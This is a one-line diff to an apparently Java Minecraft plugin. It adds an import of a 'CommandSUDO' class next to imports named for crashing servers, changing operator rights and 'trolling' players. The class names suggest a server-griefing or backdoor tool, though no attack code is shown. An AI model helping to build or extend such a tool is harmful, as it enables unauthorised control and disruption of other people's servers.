@@ -31,6 +31,7 @@ import de.Garkolym.Commands.Server.CommandBlockServerStop;
 import de.Garkolym.Commands.Server.CommandCrash;
 import de.Garkolym.Commands.Server.CommandDEOP;
 import de.Garkolym.Commands.Server.CommandOP;
+import de.Garkolym.Commands.Server.CommandSUDO;
 import de.Garkolym.Commands.Trolling.CommandGlasVirus;
 import de.Garkolym.Commands.Trolling.CommandKackRegen;
 
